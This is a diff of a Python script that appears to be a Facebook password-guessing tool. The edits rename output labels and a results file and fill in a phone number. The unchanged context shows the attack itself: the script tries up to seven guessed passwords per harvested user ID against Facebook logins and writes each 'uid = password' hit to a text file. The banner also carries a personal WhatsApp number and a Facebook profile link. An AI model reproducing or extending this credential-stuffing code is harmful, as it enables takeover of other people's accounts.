@@ -78,13 +78,13 @@ logo = """
 ##     ##  ###  ###  ##     ## ####  ######  
                                     
 \033[1;92m-----------------------------------------------
-\033[1;93m AUTHOR iZ : Awais Khan
-\033[1;94m WATHSAP  : 0317837....
+\033[1;93m OWNER IZ : Awais Khan
+\033[1;94m WATHSAP  : 03173725015
 \033[1;96m-----------------------------------------------
 \033[1;95m Facebook : https://www.facebook.com/Mohmand.awais
 \033[1;97m-----------------------------------------------
 \033[1;92m-----------------------------------------------                           
-                 USE 4G FAST SPED INTERNET
+                 USE 4G FAST SPEED INTERNET
 \033[1;96m-----------------------------------------------
  
 """
@@ -373,7 +373,7 @@ def menu_select():
  
 		print("")
  
-		idt = raw_input("\033[1;92m[#] Pest ID Link :\033[1;96m ")
+		idt = raw_input("\033[1;92m[#] Past ID Link :\033[1;96m ")
  
 		os.system("clear")
  
@@ -419,7 +419,7 @@ def menu_select():
  
 		print("")
  
-		idt = raw_input("\033[1;92m[#] Pest ID Link :\033[1;96m ")
+		idt = raw_input("\033[1;92m[#] Past ID Link :\033[1;96m ")
  
 		os.system("clear")
  
@@ -501,9 +501,9 @@ def menu_select():
  
 		    if 'www.facebook.com' in d['error_msg']:
  
-		        print("\033[1;95m Awais Cp"+uid+" = "+pass1)
+		        print("\033[1;95m Awais Ok"+uid+" = "+pass1)
  
-		        cp=open("awaiscp.txt","a")
+		        cp=open("awaisok.txt","a")
  
 		        cp.write(uid+" = "+pass1+"\n")
  
@@ -535,9 +535,9 @@ def menu_select():
  
 		            if 'www.facebook.com' in d['error_msg']:
  
-		                print("\033[1;95mAwais Cp "+uid+" = "+pass2)
+		                print("\033[1;95mAwais Ok "+uid+" = "+pass2)
  
-		                cp=open("awaiscp.txt","a")
+		                cp=open("awaisok.txt","a")
  
 		                cp.write(uid+" = "+pass2+"\n")
  
@@ -569,9 +569,9 @@ def menu_select():
  
 		                    if 'www.facebook.com' in d['error_msg']:
  
-		                        print("\033[1;95mAwais Cp "+uid+" = "+pass3)
+		                        print("\033[1;95mAwais Ok "+uid+" = "+pass3)
  
-		                        cp=open("awaiscp.txt","a")
+		                        cp=open("awaisok.txt","a")
  
 		                        cp.write(uid+" = "+pass3+"\n")
  
@@ -603,9 +603,9 @@ def menu_select():
  
 		                            if 'www.facebook.com' in d['error_msg']:
  
-		                                print("\033[1;93mAwais Cp "+uid+" = "+pass4)
+		                                print("\033[1;93mAwais Ok "+uid+" = "+pass4)
  
-		                                cp=open("awaiscp.txt","a")
+		                                cp=open("awaisok.txt","a")
  
 		                                cp.write(uid+" = "+pass4+"\n")
  
@@ -637,9 +637,9 @@ def menu_select():
  
 		                                    if 'www.facebook.com' in d['error_msg']:
  
-		                                        print("\033[1;95mAwais Cp"+uid+" = "+pass5)
+		                                        print("\033[1;95mAwais Ok"+uid+" = "+pass5)
  
-		                                        cp=open("awaiscp.txt","a")
+		                                        cp=open("awaisok.txt","a")
  
 		                                        cp.write(uid+" = "+pass5+"\n")
  
@@ -671,9 +671,9 @@ def menu_select():
  
 		                                            if 'www.facebook.com' in d['error_msg']:
  
-		                                                print("\033[1;95mAwais Cp "+uid+" = "+pass6)
+		                                                print("\033[1;95mAwais Ok "+uid+" = "+pass6)
  
-		                                                cp=open("awaiscp.txt","a")
+		                                                cp=open("awaisok.txt","a")
  
 		                                                cp.write(uid+" = "+pass6+"\n")
  
@@ -705,9 +705,9 @@ def menu_select():
  
 		                                                    if 'www.facebook.com' in d['error_msg']:
  
-		                                                        print("\033[1;93mAwais Cp"+uid+" = "+pass7)
+		                                                        print("\033[1;93mAwais Ok"+uid+" = "+pass7)
  
-		                                                        cp=open("awaiscp.txt","a")
+		                                                        cp=open("awaisok.txt","a")
  
 		                                                        cp.write(uid+" = "+pass7+"\n")
  
